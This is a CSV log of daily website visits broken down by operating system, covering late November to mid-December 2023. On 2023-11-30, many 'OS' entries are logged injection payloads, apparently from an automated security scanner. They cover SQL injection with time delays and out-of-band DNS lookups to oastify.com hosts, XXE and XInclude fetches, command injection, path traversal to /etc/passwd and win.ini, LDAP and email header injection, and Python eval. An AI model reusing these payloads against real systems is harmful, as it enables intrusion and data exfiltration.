date,os,visits
2023-12-12,iOS,17979134
2023-12-12,Windows,15139056
2023-12-12,Android,8617224
2023-12-12,Macintosh,4720681
2023-12-12,Chrome OS,1152181
2023-12-12,Linux,970343
2023-12-12,(not set),54143
2023-12-12,Tizen,940
2023-12-12,OS/2,603
2023-12-12,Fuchsia,547
2023-12-12,Firefox OS,421
2023-12-12,Playstation 4,302
2023-12-12,BlackBerry,105
2023-12-12,FreeBSD,66
2023-12-12,OpenBSD,43
2023-12-12,UNIX,39
2023-12-12,Samsung,35
2023-12-12,Xbox,35
2023-12-12,Windows Phone,26
2023-12-12,SymbianOS,20
2023-12-12,NetBSD,19
2023-12-12,SunOS,10
2023-12-12,Mac OS,8
2023-12-12,Sony,7
2023-12-12,Nokia,6
2023-12-12,Playstation Vita,4
2023-12-12,LG,3
2023-12-12,WebTV,3
2023-12-12,macOS X,3
2023-12-12,motorola/kiev_retail/kiev:11/RZK31.Q3-25-15/180c9:user/release-keys,3
2023-12-12,PalmOS,2
2023-12-12,BeOS,1
2023-12-12,IRIX,1
2023-12-12,Solaris,1
2023-12-12,TECNO/BF6-OP/TECNO-BF6:12/SP1A.210812.001/230408V493:user/release-keys,1
2023-12-12,iPhone,1
2023-12-12,realme/RMX2185/RMX2185:10/QP1A.190711.020/1655708528:user/release-keys,1
2023-12-11,iOS,19000515
2023-12-11,Windows,15421722
2023-12-11,Android,9175234
2023-12-11,Macintosh,4744340
2023-12-11,Chrome OS,1154442
2023-12-11,Linux,988263
2023-12-11,(not set),49841
2023-12-11,Tizen,921
2023-12-11,OS/2,630
2023-12-11,Fuchsia,536
2023-12-11,Firefox OS,417
2023-12-11,Playstation 4,320
2023-12-11,BlackBerry,117
2023-12-11,FreeBSD,70
2023-12-11,UNIX,54
2023-12-11,OpenBSD,38
2023-12-11,Samsung,35
2023-12-11,Xbox,34
2023-12-11,Windows Phone,31
2023-12-11,NetBSD,20
2023-12-11,SymbianOS,14
2023-12-11,Playstation Vita,6
2023-12-11,Sony,6
2023-12-11,Mac OS,4
2023-12-11,SunOS,4
2023-12-11,Nintendo Wii,3
2023-12-11,PalmOS,3
2023-12-11,TECNO/BF6-OP/TECNO-BF6:12/SP1A.210812.001/230408V493:user/release-keys,3
2023-12-11,LG,2
2023-12-11,Nokia,2
2023-12-11,Playstation 3,1
2023-12-11,Vodafone,1
2023-12-11,macOS X,1
2023-12-10,iOS,13070609
2023-12-10,Android,6766552
2023-12-10,Windows,5693904
2023-12-10,Macintosh,3028622
2023-12-10,Linux,794155
2023-12-10,Chrome OS,385113
2023-12-10,(not set),34525
2023-12-10,Tizen,937
2023-12-10,Fuchsia,600
2023-12-10,OS/2,587
2023-12-10,Firefox OS,434
2023-12-10,Playstation 4,388
2023-12-10,BlackBerry,114
2023-12-10,FreeBSD,64
2023-12-10,Xbox,34
2023-12-10,OpenBSD,33
2023-12-10,Windows Phone,30
2023-12-10,Samsung,27
2023-12-10,UNIX,21
2023-12-10,SymbianOS,16
2023-12-10,NetBSD,10
2023-12-10,SunOS,10
2023-12-10,Playstation Vita,6
2023-12-10,Sony,5
2023-12-10,Mac OS,3
2023-12-10,Nintendo Wii,3
2023-12-10,Nokia,3
2023-12-10,LG,2
2023-12-10,PalmOS,2
2023-12-10,macOS X,2
2023-12-10,Playstation 3,1
2023-12-10,Solaris,1
2023-12-10,T-Mobile/Newcastle/Newcastle:12/SP1A.210812.016/SW_S98117AA1_S_V023:user/release-keys,1
2023-12-10,TECNO/BF6-OP/TECNO-BF6:12/SP1A.210812.001/230408V493:user/release-keys,1
2023-12-10,WebTV,1
2023-12-10,samsung/b0quew/b0q:13/TP1A.220624.014/S908U1UEU2CWAI:user/release-keys,1
2023-12-09,iOS,15730805
2023-12-09,Android,7611695
2023-12-09,Windows,5373222
2023-12-09,Macintosh,2794971
2023-12-09,Linux,834340
2023-12-09,Chrome OS,310108
2023-12-09,(not set),37561
2023-12-09,Tizen,974
2023-12-09,OS/2,685
2023-12-09,Fuchsia,638
2023-12-09,Firefox OS,450
2023-12-09,Playstation 4,407
2023-12-09,BlackBerry,95
2023-12-09,FreeBSD,80
2023-12-09,UNIX,65
2023-12-09,OpenBSD,37
2023-12-09,Xbox,35
2023-12-09,Samsung,32
2023-12-09,SymbianOS,25
2023-12-09,Windows Phone,20
2023-12-09,NetBSD,15
2023-12-09,Mac OS,9
2023-12-09,Sony,9
2023-12-09,PalmOS,7
2023-12-09,SunOS,7
2023-12-09,Playstation Vita,6
2023-12-09,Nokia,5
2023-12-09,Solaris,3
2023-12-09,BeOS,1
2023-12-09,MOT,1
2023-12-09,NTT DoCoMo,1
2023-12-09,Playstation Portable,1
2023-12-09,Vodafone,1
2023-12-09,macOS X,1
2023-12-09,samsung/b0quew/b0q:13/TP1A.220624.014/S908U1UEU2CWAI:user/release-keys,1
2023-12-08,iOS,18141472
2023-12-08,Windows,12029833
2023-12-08,Android,8513504
2023-12-08,Macintosh,4013482
2023-12-08,Chrome OS,1023744
2023-12-08,Linux,1023146
2023-12-08,(not set),42952
2023-12-08,Tizen,913
2023-12-08,OS/2,647
2023-12-08,Fuchsia,548
2023-12-08,Firefox OS,448
2023-12-08,Playstation 4,389
2023-12-08,UNIX,145
2023-12-08,BlackBerry,102
2023-12-08,FreeBSD,76
2023-12-08,OpenBSD,39
2023-12-08,Xbox,36
2023-12-08,Samsung,31
2023-12-08,SymbianOS,30
2023-12-08,Windows Phone,26
2023-12-08,NetBSD,22
2023-12-08,Nokia,10
2023-12-08,Mac OS,6
2023-12-08,Sony,6
2023-12-08,BeOS,3
2023-12-08,Playstation Vita,3
2023-12-08,SunOS,3
2023-12-08,macOS X,3
2023-12-08,MOT,2
2023-12-08,PalmOS,2
2023-12-08,NTT DoCoMo,1
2023-12-08,motorola/kiev_retail/kiev:11/RZK31.Q3-25-15/180c9:user/release-keys,1
2023-12-08,samsung/b0quew/b0q:13/TP1A.220624.014/S908U1UEU2CWAI:user/release-keys,1
2023-12-07,iOS,19839824
2023-12-07,Windows,15065560
2023-12-07,Android,8984619
2023-12-07,Macintosh,4742842
2023-12-07,Chrome OS,1230112
2023-12-07,Linux,1138846
2023-12-07,(not set),40251
2023-12-07,Tizen,920
2023-12-07,OS/2,666
2023-12-07,Fuchsia,577
2023-12-07,Firefox OS,459
2023-12-07,Playstation 4,403
2023-12-07,BlackBerry,108
2023-12-07,FreeBSD,89
2023-12-07,Xbox,43
2023-12-07,OpenBSD,36
2023-12-07,Samsung,33
2023-12-07,UNIX,28
2023-12-07,SymbianOS,23
2023-12-07,Windows Phone,21
2023-12-07,NetBSD,14
2023-12-07,Mac OS,10
2023-12-07,SunOS,7
2023-12-07,Playstation Vita,6
2023-12-07,Sony,6
2023-12-07,PalmOS,5
2023-12-07,macOS X,3
2023-12-07,Nokia,2
2023-12-07,BeOS,1
2023-12-07,HPUX,1
2023-12-07,MOT,1
2023-12-07,Playstation 3,1
2023-12-07,Playstation Portable,1
2023-12-07,iPhone,1
2023-12-06,iOS,19312115
2023-12-06,Windows,16174418
2023-12-06,Android,8936159
2023-12-06,Macintosh,4831355
2023-12-06,Chrome OS,1219619
2023-12-06,Linux,1134953
2023-12-06,(not set),41177
2023-12-06,Tizen,981
2023-12-06,OS/2,562
2023-12-06,Fuchsia,507
2023-12-06,Firefox OS,441
2023-12-06,Playstation 4,370
2023-12-06,BlackBerry,101
2023-12-06,FreeBSD,82
2023-12-06,UNIX,71
2023-12-06,Windows Phone,39
2023-12-06,Xbox,36
2023-12-06,OpenBSD,31
2023-12-06,Samsung,31
2023-12-06,SymbianOS,23
2023-12-06,NetBSD,16
2023-12-06,Mac OS,8
2023-12-06,SunOS,8
2023-12-06,Nokia,4
2023-12-06,Playstation Vita,4
2023-12-06,Sony,4
2023-12-06,PalmOS,3
2023-12-06,macOS X,2
2023-12-06,IRIX,1
2023-12-06,Nintendo Wii,1
2023-12-06,Playstation 3,1
2023-12-06,Vodafone,1
2023-12-06,iPhone,1
2023-12-05,iOS,19363618
2023-12-05,Windows,15870248
2023-12-05,Android,9359706
2023-12-05,Macintosh,5010919
2023-12-05,Chrome OS,1267683
2023-12-05,Linux,1190116
2023-12-05,(not set),36460
2023-12-05,Tizen,982
2023-12-05,OS/2,594
2023-12-05,Fuchsia,566
2023-12-05,Firefox OS,483
2023-12-05,Playstation 4,354
2023-12-05,BlackBerry,99
2023-12-05,FreeBSD,78
2023-12-05,UNIX,51
2023-12-05,OpenBSD,40
2023-12-05,Xbox,33
2023-12-05,Samsung,26
2023-12-05,NetBSD,20
2023-12-05,Windows Phone,20
2023-12-05,SymbianOS,18
2023-12-05,Mac OS,9
2023-12-05,Playstation Vita,9
2023-12-05,Sony,9
2023-12-05,SunOS,6
2023-12-05,Nintendo Wii,4
2023-12-05,PalmOS,4
2023-12-05,macOS X,4
2023-12-05,Nokia,3
2023-12-05,BeOS,1
2023-12-05,IRIX,1
2023-12-05,NTT DoCoMo,1
2023-12-05,SoftBank,1
2023-12-05,T-Mobile/Newcastle/Newcastle:12/SP1A.210812.016/SW_S98117AA1_S_V023:user/release-keys,1
2023-12-05,Vodafone,1
2023-12-05,iPhone,1
2023-12-04,iOS,20046163
2023-12-04,Windows,16429056
2023-12-04,Android,9538506
2023-12-04,Macintosh,5304277
2023-12-04,Chrome OS,1227045
2023-12-04,Linux,1080348
2023-12-04,(not set),32946
2023-12-04,Tizen,1021
2023-12-04,OS/2,604
2023-12-04,Fuchsia,556
2023-12-04,Firefox OS,451
2023-12-04,Playstation 4,367
2023-12-04,BlackBerry,119
2023-12-04,FreeBSD,91
2023-12-04,UNIX,66
2023-12-04,Samsung,46
2023-12-04,Windows Phone,34
2023-12-04,OpenBSD,33
2023-12-04,Xbox,31
2023-12-04,NetBSD,18
2023-12-04,SymbianOS,17
2023-12-04,Mac OS,11
2023-12-04,Sony,6
2023-12-04,Nokia,4
2023-12-04,SunOS,4
2023-12-04,PalmOS,3
2023-12-04,macOS X,3
2023-12-04,MOT,2
2023-12-04,Playstation Vita,2
2023-12-04,SoftBank,2
2023-12-04,BeOS,1
2023-12-04,NTT DoCoMo,1
2023-12-04,OPPO/CPH2239/OP4F2F:11/RP1A.200720.011/1690886540868:user/release-keys,1
2023-12-04,OnePlus/OnePlus7Pro_EEA/OnePlus7Pro:12/SKQ1.211113.001/P.202301251815:user/release-keys,1
2023-12-04,Playstation 3,1
2023-12-04,Solaris,1
2023-12-03,iOS,13661379
2023-12-03,Android,6963910
2023-12-03,Windows,6073273
2023-12-03,Macintosh,3289828
2023-12-03,Linux,917120
2023-12-03,Chrome OS,401947
2023-12-03,(not set),21745
2023-12-03,Tizen,951
2023-12-03,OS/2,617
2023-12-03,Fuchsia,554
2023-12-03,Firefox OS,393
2023-12-03,Playstation 4,319
2023-12-03,BlackBerry,114
2023-12-03,FreeBSD,64
2023-12-03,Samsung,34
2023-12-03,UNIX,34
2023-12-03,OpenBSD,30
2023-12-03,Xbox,27
2023-12-03,SymbianOS,24
2023-12-03,NetBSD,22
2023-12-03,Windows Phone,22
2023-12-03,Playstation Vita,7
2023-12-03,Sony,7
2023-12-03,Mac OS,6
2023-12-03,PalmOS,4
2023-12-03,Nokia,2
2023-12-03,SunOS,2
2023-12-03,macOS X,2
2023-12-03,BeOS,1
2023-12-03,IRIX,1
2023-12-03,Nintendo Wii,1
2023-12-03,Vodafone,1
2023-12-02,iOS,16397242
2023-12-02,Android,8016086
2023-12-02,Windows,6069318
2023-12-02,Macintosh,3027077
2023-12-02,Linux,886619
2023-12-02,Chrome OS,346461
2023-12-02,(not set),23930
2023-12-02,Tizen,1038
2023-12-02,Fuchsia,608
2023-12-02,OS/2,599
2023-12-02,Firefox OS,410
2023-12-02,Playstation 4,357
2023-12-02,BlackBerry,95
2023-12-02,FreeBSD,88
2023-12-02,OpenBSD,49
2023-12-02,UNIX,46
2023-12-02,Samsung,40
2023-12-02,NetBSD,30
2023-12-02,Xbox,25
2023-12-02,Windows Phone,18
2023-12-02,SymbianOS,13
2023-12-02,Mac OS,11
2023-12-02,Sony,7
2023-12-02,SunOS,7
2023-12-02,Nokia,4
2023-12-02,Playstation Vita,3
2023-12-02,MOT,2
2023-12-02,PalmOS,2
2023-12-02,WebTV,1
2023-12-02,macOS X,1
2023-12-02,samsung/a53xnsxx/a53x:13/TP1A.220624.014/A536EXXU7CWGJ:user/release-keys,1
2023-12-02,samsung/t2qzhx/t2q:13/TP1A.220624.014/G9960ZHU5EWH6:user/release-keys,1
2023-12-01,iOS,19113402
2023-12-01,Windows,13664534
2023-12-01,Android,8866282
2023-12-01,Macintosh,4523400
2023-12-01,Chrome OS,1143538
2023-12-01,Linux,986266
2023-12-01,(not set),28428
2023-12-01,Tizen,1227
2023-12-01,OS/2,689
2023-12-01,Fuchsia,515
2023-12-01,Firefox OS,512
2023-12-01,Playstation 4,335
2023-12-01,FreeBSD,90
2023-12-01,BlackBerry,78
2023-12-01,Samsung,36
2023-12-01,Xbox,33
2023-12-01,OpenBSD,27
2023-12-01,UNIX,22
2023-12-01,NetBSD,21
2023-12-01,Windows Phone,20
2023-12-01,SymbianOS,19
2023-12-01,Mac OS,13
2023-12-01,Sony,9
2023-12-01,Playstation Vita,7
2023-12-01,SunOS,7
2023-12-01,Nokia,6
2023-12-01,PalmOS,6
2023-12-01,Playstation Portable,2
2023-12-01,macOS X,2
2023-12-01,BeOS,1
2023-12-01,NTT DoCoMo,1
2023-12-01,OPPO/CPH2239/OP4F2F:11/RP1A.200720.011/1690886540868:user/release-keys,1
2023-11-30,iOS,18809314
2023-11-30,Windows,16309153
2023-11-30,Android,9210307
2023-11-30,Macintosh,4924649
2023-11-30,Chrome OS,1298595
2023-11-30,Linux,1062833
2023-11-30,(not set),36494
2023-11-30,Tizen,1330
2023-11-30,OS/2,698
2023-11-30,Fuchsia,558
2023-11-30,Firefox OS,500
2023-11-30,Playstation 4,361
2023-11-30,BlackBerry,119
2023-11-30,FreeBSD,77
2023-11-30,OpenBSD,48
2023-11-30,UNIX,40
2023-11-30,Samsung,35
2023-11-30,Windows Phone,34
2023-11-30,SymbianOS,23
2023-11-30,NetBSD,21
2023-11-30,Xbox,16
2023-11-30,Playstation Vita,15
2023-11-30,Mac OS,13
2023-11-30,Sony,6
2023-11-30,Nokia,5
2023-11-30,PalmOS,4
2023-11-30,SunOS,3
2023-11-30,MOT,2
2023-11-30,Nintendo Wii,2
2023-11-30,"(select extractvalue(xmltype('<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE root [ <!ENTITY % graxq SYSTEM ""http://woo7ur2i2kf80r9v5bzoe0ssajgc42s5gw31rq.oasti'||'fy.com/"">%graxq;]>'),'/l') from dual)",1
2023-11-30,(select load_file('\\\\fo7qua2123fr0a9e5uz7ejsba2gv4lscu0lnqbf.oastify.com\\eqb')),1
2023-11-30,*)(!(objectClass=*),1
2023-11-30,*)(objectClass=*,1
2023-11-30,-->'-->`--><!--#set var=vgy value=ufx5lptgti--><!--#set var=xi0 value=whz7nrvivk--><!--#echo var=vgy--><!--#echo var=xi0--><!--#exec cmd=nslookup -q=cname h2ks8cg3g5ttecngjwd9sl6do4uxin6f43vq0ep.oastify.com -->,1
2023-11-30,.../Linux,1
2023-11-30,../../../../../../../../../../../../../../../../etc/passwd,1
2023-11-30,../../../../../../../../../../../../../../../../etc/passwd%00Linux,1
2023-11-30,..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini,1
2023-11-30,..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini%00Linux,1
2023-11-30,/etc/passwd,1
2023-11-30,4uivbesp1i)(!(objectClass=*),1
2023-11-30,"<ckj xmlns=""http://a.b/"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xsi:schemaLocation=""http://a.b/ http://il7trdz4z6cuxd6h2xwabmpe75dy1opodf0ko9.oastify.com/ckj.xsd"">ckj</ckj>",1
2023-11-30,"<ydl xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""http://vsr6yq6h6jj74qdu9a3nizwreikb81w2kt7yvn.oastify.com/foo""/></ydl>",1
2023-11-30,BeOS,1
2023-11-30,LG,1
2023-11-30,"Linux
BCC:go8rub2224fs0b9f5vz8eksca3gw4msel2cphd6@oastify.com
vte: d",1
2023-11-30,"Linux""",1
2023-11-30,"Linux""|echo d47iksvf5m ctdmejl6bp ||",1
2023-11-30,"Linux""|ping -n 21 127.0.0.1 ||",1
2023-11-30,"Linux%}lvxrn'/""<pnroj",1
2023-11-30,Linux&echo 4r76ggl8d8 freo5ed8r5&,1
2023-11-30,"Linux&nslookup -q=cname 6krhq1ysyubiw1551lvyaao26tcm0co7cyz3ns.oastify.com.&'\""`0&nslookup -q=cname 6krhq1ysyubiw1551lvyaao26tcm0co7cyz3ns.oastify.com.&`'",1
2023-11-30,Linux&ping -n 21 127.0.0.1&,1
2023-11-30,Linux',1
2023-11-30,Linux' and '3424'='3424,1
2023-11-30,Linux' and '4452'='4460,1
2023-11-30,Linux' and (select*from(select(sleep(20)))a)-- ,1
2023-11-30,Linux' and 2206=2208-- ,1
2023-11-30,Linux' and 4141=4141-- ,1
2023-11-30,Linux' waitfor delay'0:0:20'--,1
2023-11-30,"Linux'""`0&nslookup -q=cname 5hngn0vrvt8ht024yksx79l13s9lxbl89zw4kt.oastify.com.&`'",1
2023-11-30,Linux'(select*from(select(sleep(20)))a)',1
2023-11-30,Linux');declare @q varchar(99);set @q='\\255dbxjojqwehxq1mhguv69yrpxil89z2ntayyn.oasti'+'fy.com\hrs'; exec master.dbo.xp_dirtree @q;-- ,1
2023-11-30,Linux')waitfor delay'0:0:20'--,1
2023-11-30,"Linux'+(function(){if(typeof zxmyz===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);zxmyz=1;}}())+'",1
2023-11-30,Linux'+(select load_file('\\\\mqgxwh484ahy2hbl711egquic9i26sujx7outii.oastify.com\\cvk'))+',1
2023-11-30,Linux'+(select*from(select(sleep(20)))a)+',1
2023-11-30,"Linux'+eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))+'",1
2023-11-30,Linux'+sleep(20.to_i)+',1
2023-11-30,"Linux',0)waitfor delay'0:0:20'--",1
2023-11-30,Linux'.sleep(20).',1
2023-11-30,Linux';declare @q varchar(99);set @q='\\sie3onwewg94un3rz7tk8wmo4fa8yympdd409oy.oasti'+'fy.com\gts'; exec master.dbo.xp_dirtree @q;-- ,1
2023-11-30,"Linux'|echo 3o866q8h9s cd9w4term0 #xzwx",1
2023-11-30,"Linux'|ping -c 21 127.0.0.1 #",1
2023-11-30,"Linux'||(select extractvalue(xmltype('<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE root [ <!ENTITY % graxq SYSTEM ""http://jylu4ec5c7pvaejify9bon2fk6qzep2tqkdp1e.oasti'||'fy.com/"">%graxq;]>'),'/l') from dual)||'",1
2023-11-30,Linux);declare @q varchar(99);set @q='\\grbrxb5254is3bcf8v28hkvcd3jw7mvdn1eojc8.oasti'+'fy.com\dwu'; exec master.dbo.xp_dirtree @q;-- ,1
2023-11-30,"Linux,(select*from(select(sleep(20)))a)",1
2023-11-30,Linux../../../../../../../../../../../../../../../../etc/passwd,1
2023-11-30,Linux..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini,1
2023-11-30,Linux42267017' or '7302'='7303,1
2023-11-30,Linux43845002' or 7978=7978-- ,1
2023-11-30,Linux65212037' or 2382=2388-- ,1
2023-11-30,Linux74903521' or '9415'='9415,1
2023-11-30,Linux;declare @q varchar(99);set @q='\\b3fm96hxhzunf6oakqe3tf77pyvrjh78xwojt7i.oasti'+'fy.com\yay'; exec master.dbo.xp_dirtree @q;-- ,1
2023-11-30,"Linux>
BCC:nb2yhip9pb2zniwms2mf1rfjxa33rtfl990w5ku@oastify.com
hto: e",1
2023-11-30,Linux]]>><,1
2023-11-30,"Linuxsll52%>xo4ck'/""<zg08j",1
2023-11-30,Linuxwg2r40hwrc,1
2023-11-30,Linux{${sleep(20)}},1
2023-11-30,"Linux|echo 8dlxnd1jx8 571y402hz1||a #' |echo 8dlxnd1jx8 571y402hz1||a #|"" |echo 8dlxnd1jx8 571y402hz1||a #",1
2023-11-30,"Linux|nslookup -q=cname zloaruzlzncbxu6y2ewrb3pv7mdf15p1ds0xom.oastify.com.&",1
2023-11-30,"Linux|ping -c 21 127.0.0.1||x",1
2023-11-30,"Linux|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",1
2023-11-30,"Linux}}g3za3'/""<vb6sf",1
2023-11-30,OPPO/CPH2239/OP4F2F:11/RP1A.200720.011/1690886540868:user/release-keys,1
2023-11-30,be51smiq09,1
2023-11-30,c:\windows\win.ini,1
2023-11-30,"eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))",1
2023-11-30,http://ei0po9w0w29qu93dztt68ima41auykmaa1x6lv.oastify.com/?Linux,1
2023-11-30,n1py7if9fbszdimmi2cfrr5jnat3ht5ltcgh46.oastify.com,1
2023-11-30,n4p4ifaq49)(objectClass=*,1
2023-11-30,nslookup -q=cname 94bka4ivixvlg4p8lof1ud85qwwpkf88bw2j77w.oastify.com.&,1
2023-11-30,rr8iw0o5dt,1
2023-11-29,iOS,18920876
2023-11-29,Windows,15747501
2023-11-29,Android,8914422
2023-11-29,Macintosh,4961379
2023-11-29,Chrome OS,1240160
2023-11-29,Linux,1038084
2023-11-29,(not set),33160
2023-11-29,Tizen,899
2023-11-29,OS/2,593
2023-11-29,Fuchsia,580
2023-11-29,Firefox OS,466
2023-11-29,Playstation 4,335
2023-11-29,BlackBerry,109
2023-11-29,FreeBSD,91
2023-11-29,UNIX,72
2023-11-29,Samsung,41
2023-11-29,OpenBSD,40
2023-11-29,Windows Phone,40
2023-11-29,SymbianOS,31
2023-11-29,Xbox,19
2023-11-29,NetBSD,18
2023-11-29,Sony,16
2023-11-29,Mac OS,15
2023-11-29,SunOS,14
2023-11-29,Nokia,6
2023-11-29,MOT,2
2023-11-29,NTT DoCoMo,2
2023-11-29,PalmOS,2
2023-11-29,Playstation 3,2
2023-11-29,Playstation Vita,2
2023-11-29,Solaris,2
2023-11-29,BeOS,1
2023-11-29,IRIX,1
2023-11-29,LG,1
2023-11-28,iOS,17826241
2023-11-28,Windows,15522539
2023-11-28,Android,8512451
2023-11-28,Macintosh,5134088
2023-11-28,Chrome OS,1243361
2023-11-28,Linux,1083147
2023-11-28,(not set),40256
2023-11-28,Tizen,892
2023-11-28,OS/2,633
2023-11-28,Fuchsia,601
2023-11-28,Firefox OS,440
2023-11-28,Playstation 4,333
2023-11-28,BlackBerry,128
2023-11-28,FreeBSD,95
2023-11-28,Samsung,39
2023-11-28,UNIX,36
2023-11-28,OpenBSD,30
2023-11-28,SymbianOS,29
2023-11-28,Xbox,27
2023-11-28,Windows Phone,22
2023-11-28,NetBSD,18
2023-11-28,SunOS,11
2023-11-28,Playstation Vita,9
2023-11-28,Nokia,5
2023-11-28,Sony,4
2023-11-28,Mac OS,3
2023-11-28,NTT DoCoMo,2
2023-11-28,PalmOS,2
2023-11-28,BeOS,1
2023-11-28,MOT,1
2023-11-28,Playstation Portable,1
2023-11-28,WebTV,1
2023-11-28,macOS X,1
2023-11-27,iOS,17441512
2023-11-27,Windows,16375703
2023-11-27,Android,8519500
2023-11-27,Macintosh,5019810
2023-11-27,Chrome OS,1119338
2023-11-27,Linux,1015509
2023-11-27,(not set),34099
2023-11-27,Tizen,910
2023-11-27,OS/2,609
2023-11-27,Fuchsia,566
2023-11-27,Firefox OS,462
2023-11-27,Playstation 4,304
2023-11-27,BlackBerry,114
2023-11-27,FreeBSD,106
2023-11-27,OpenBSD,53
2023-11-27,UNIX,50
2023-11-27,Samsung,41
2023-11-27,SymbianOS,30
2023-11-27,Xbox,28
2023-11-27,NetBSD,24
2023-11-27,Windows Phone,23
2023-11-27,SunOS,12
2023-11-27,Playstation Vita,8
2023-11-27,Sony,7
2023-11-27,Nintendo Wii,5
2023-11-27,Nokia,5
2023-11-27,PalmOS,2
2023-11-27,LG,1
2023-11-27,MOT,1
2023-11-27,Mac OS,1
2023-11-27,NTT DoCoMo,1
2023-11-27,WebTV,1
2023-11-27,iPhone,1
2023-11-27,samsung/a14xub/a14x:13/TP1A.220624.014/A146MUBU2AWF4:user/release-keys,1
2023-11-26,iOS,11883302
2023-11-26,Android,6341407
2023-11-26,Windows,5719497
2023-11-26,Macintosh,2980726
2023-11-26,Linux,818510
2023-11-26,Chrome OS,347851
2023-11-26,(not set),25857
2023-11-26,Tizen,955
2023-11-26,Fuchsia,656
2023-11-26,OS/2,643
2023-11-26,Firefox OS,472
2023-11-26,Playstation 4,296
2023-11-26,BlackBerry,85
2023-11-26,FreeBSD,68
2023-11-26,Samsung,47
